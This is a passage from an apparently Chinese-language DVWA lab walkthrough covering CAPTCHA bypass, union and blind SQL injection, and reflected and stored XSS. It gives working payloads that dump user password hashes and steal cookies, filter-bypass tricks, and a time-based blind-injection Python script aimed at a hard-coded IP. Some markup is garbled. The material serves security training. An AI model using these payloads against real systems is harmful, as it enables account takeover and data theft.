CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if they did stage 1 if( !$_POST[ &#39;passed_captcha&#39; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码<br>&amp;passed_captcha=true</p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ &#39;recaptcha_response_field&#39; ] != &#39;hidd3n_valu3&#39; || $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] != &#39;reCAPTCHA&#39; ) ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>更改参数recaptcha_response_field以及http包头的User-Agent：等于reCAPTCHA</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241515_889.png" alt=""></p><p>impossible：<br>该级别代码未发现漏洞</p><h3 id="八：SQL-Injection（SQL注入）"><a href="#八：SQL-Injection（SQL注入）" class="headerlink" title="八：SQL Injection（SQL注入）"></a>八：SQL Injection（SQL注入）</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><p>手工注入（非盲注）的步骤。</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.下载数据</code></pre><p>Low：</p><pre><code>&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) { // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last  = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; // Increase loop count $i++; } mysql_close(); } ?&gt;</code></pre><p>1.<img src="http://oy0tigw51.bkt.clouddn.com/201710241530_443.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241533_295.png" alt=""><br>2.猜解SQL查询语句中的字段数<br>union select 1,2,3<br>3.确定显示的字段顺序<br>1′ union select 1,2 #<br>4.获取当前数据库</p><p>输入1′ union select 1,database() #，<br>5.获取数据库中的表</p><p>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，<br>6.获取表中的字段名</p><p>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #<br>7.下载数据</p><p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br>的数据<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241607_214.png" alt=""></p><p>得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><h5 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h5><p>&lt;?php </p><p>if( isset( $_POST[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_POST[ ‘id’ ];<br>    $id = mysql_real_escape_string( $id ); </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Display values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } //mysql_close(); </code></pre><p>} </p><p>?&gt;</p><p>区别代码：</p><blockquote><p>$id = mysql_real_escape_string( $id );</p></blockquote><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入<br>依然可以通过抓包改参数，提交恶意构造的查询参数。<br>1.判断是否存在注入，注入是字符型还是数字型<br>1.id为1 or 1=1 #<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241617_591.png" alt=""><br>查询成功<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241618_406.png" alt=""><br>2.猜解SQL查询语句中的字段数</p><p>抓包更改参数id为1 order by 2 #，查询成功：<br>抓包更改参数id为1 order by 3 #，报错：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p><p>3.确定显示的字段顺序</p><p>抓包更改参数id为1 union select 1,2 #，查询成功：<br>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p><p>4.获取当前数据库</p><p>抓包更改参数id为1 union select 1,database() #，查询成功：<br>说明当前的数据库为dvwa。</p><p>5.获取数据库中的表</p><p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><p>6.获取表中的字段名</p><p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p><p>这是因为单引号被转义了，变成了\’。</p><p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><p>7.得到数据</p><p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241642_694.png" alt=""><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><p>High：</p><p>&lt;?php </p><p>if( isset( $_SESSION [ ‘id’ ] ) ) {<br>    // Get input<br>    $id = $_SESSION[ ‘id’ ]; </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Get values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><blockquote><p>$query  = “SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;”; </p></blockquote><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。<br>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>Impossible：<br>Impossible级别的代码采用了PDO技术，暂时不会</p><p><a href="http://blog.chinaunix.net/uid-11582448-id-4432211.html" target="_blank" rel="external">SQLmap注入方法注入dvwa</a></p><h3 id="九：SQL-Injection-Blind"><a href="#九：SQL-Injection-Blind" class="headerlink" title="九：SQL Injection(Blind)"></a>九：SQL Injection(Blind)</h3><p>手工盲注的步骤（可与之前的手工注入作比较）：</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解当前数据库名3.猜解数据库中的表名4.猜解表中的字段名5.猜解数据</code></pre><p>Low：</p><p>&lt;?php </p><p>if( isset( $_GET[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_GET[ ‘id’ ]; </p><pre><code>// Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) {     // Feedback for end user     echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else {     // User wasn&#39;t found, so the page wasn&#39;t!     header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );     // Feedback for end user     echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p><p>基于布尔的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：<br>输入1’ and 1=1 #，显示存在：<br>输入1’ and 1=2 #，显示不存在：<br>说明存在字符型的SQL盲注。<br>2.猜解当前数据库名</p><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><pre><code>输入1’ and length(database())=1 #，显示不存在；输入1’ and length(database())=2 #，显示不存在；输入1’ and length(database())=3 #，显示不存在；输入1’ and length(database())=4 #，显示存在：</code></pre><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。…</code></pre><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</code></pre><p>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在…1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</code></pre><p>说明第一个表名长度为9。</p><pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</code></pre><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在…1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</code></pre><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在…1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</code></pre><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。<br>5.猜解数据</p><p>同样采用二分法。</p><p>还可以使用基于时间的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型</p><pre><code>输入1’ and sleep(5) #，感觉到明显延迟；输入1 and sleep(5) #，没有延迟；</code></pre><p>说明存在字符型的基于时间的盲注。<br>2.猜解当前数据库名</p><p>首先猜解数据名的长度：</p><pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟1’ and if(length(database())=2,sleep(5),1) # 没有延迟1’ and if(length(database())=3,sleep(5),1) # 没有延迟1’ and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟说明数据库名的第一个字符为小写字母d。…</code></pre><p>重复上述步骤，即可猜解出数据库名。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</code></pre><p>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</code></pre><p>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟…1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</code></pre><p>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</code></pre><p>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。<br>5.猜解数据</p><p>同样采用二分法。太浪费时间了。推荐写python脚本</p><pre><code># -*-coding:utf-8-*-  import requests  import timepayloads = &#39;abcdefghijklmnopqrstuvwxyz0123456789@_.{}-&#39;flag = &#39;&#39;url = &quot;http://222.18.158.243:4609/index.php&quot;print(&#39;test1&#39;)for x in range(1,7):for char in payloads:starttime = time.time()payload = {&quot;id&quot;: &quot;1 and if(substring(database(), &quot;+str(x)+&quot;, 1)=&#39;&quot;+char+&quot;&#39;,sleep(6),1)#&quot;}rev = requests.get(url, cookies=cookies, params=payload)if time.time() - starttime &gt; 6:flag += charprint(&#39;DatabaseName = &#39;+flag)</code></pre><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = mysql_real_escape_string( $id ); // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } //mysql_close(); } ?&gt; </code></pre><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>基于布尔的盲注：</p><pre><code>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>基于时间的盲注：</p><pre><code>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_COOKIE[ &#39;id&#39; ] ) ) { // Get input $id = $_COOKIE[ &#39;id&#39; ]; // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); } ?&gt;</code></pre><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。<br>漏洞利用</p><p>虽然添加了LIMIT 1，但是可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，基于布尔的盲注：</p><pre><code>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>Impossible</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $id = $_GET[ &#39;id&#39; ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 基本无法注入。</p><h3 id="十-反射型XSS"><a href="#十-反射型XSS" class="headerlink" title="十:反射型XSS"></a>十:反射型XSS</h3><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>推荐xss cheat sheet<br><a href="http://www.52bug.cn/?post=211" target="_blank" rel="external">xss漏洞检测指南</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241842_78.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241843_306.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241844_339.png" alt=""></p><p>Low：</p><pre><code>&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt;</code></pre><p>无验证，直接注入</p><script>alert(document.cookie)</script>爆出cookie内容![](http://oy0tigw51.bkt.clouddn.com/201710241848_956.png)Medium：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = str_replace( '<script>', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}</pre>";     }     ?>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。双写绕过输入<sc<script>ript>alert(/xss/)</script>，成功弹框：![](http://oy0tigw51.bkt.clouddn.com/201710241856_385.png)大小写混淆绕过输入<script>alert(/xss/)</script>，成功弹框High：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     ?>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。绕过思路：标签很多，换一种标签即可。这里用img<img src="1" onerror="alert(document.cookie)">![](http://oy0tigw51.bkt.clouddn.com/201710241900_85.png)Impossible：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $name = htmlspecialchars( $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     // Generate Anti-CSRF token     generateSessionToken();     ?>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。无法注入。### 十一：存储型XSSLow：    <?php     if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name= trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     // Sanitize name input     $name = mysql_real_escape_string( $name );     // Update database     $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";     $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '' );     //mysql_close();     }     ?>stripslashes(string)函数删除字符串中的反斜杠。可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<script>alert(/xss/)</script> name一栏前端有字数限制，burp抓包改为<script>alert(/name/)</script><p>Medium</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>查看源码发现Name只过滤了<scrpit>标签<br>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。<br>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>burp抓包改name参数为<sc<script>ript&gt;alert(/xss/):<br>2.大小写混淆绕过<br>抓包改name参数为<script>alert(/xss/)</script>:<br>High</sc<script></b></scrpit></p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message 